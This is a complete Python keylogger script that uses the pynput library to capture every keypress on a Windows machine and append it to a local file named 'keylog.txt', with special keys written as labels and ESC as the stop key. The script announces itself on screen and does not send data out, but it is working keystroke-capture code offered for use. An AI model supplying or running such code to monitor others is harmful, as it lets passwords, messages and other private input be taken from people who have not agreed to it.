from pynput import keyboard

# File to save the logs
log_file = "keylog.txt"

def on_press(key):
    try:
        # Standard character keys (a, b, 1, 2...)
        # We replace the single quotes pynput adds (e.g., 'a' -> a)
        log_key = str(key.char)
    except AttributeError:
        # Handle special keys (Space, Enter, Shift, etc.)
        if key == keyboard.Key.space:
            log_key = " "
        elif key == keyboard.Key.enter:
            log_key = "\n"  # New line
        elif key == keyboard.Key.backspace:
            log_key = "[BACKSPACE]"
        else:
            # For other special keys like Shift/Ctrl/Alt, wrap them in brackets
            log_key = f" [{str(key).replace('Key.', '').upper()}] "

    # Open file and append the key
    # We use 'utf-8' encoding to handle special characters correctly on Windows
    try:
        with open(log_file, "a", encoding="utf-8") as f:
            f.write(log_key)
    except Exception as e:
        print(f"Error saving data: {e}")

def on_release(key):
    # Stop the program if the ESC key is pressed
    if key == keyboard.Key.esc:
        return False

print("Windows Keylogger started...")
print(f"Saving keystrokes to '{log_file}'")
print("Press ESC to stop the logging.")

# Start the Listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
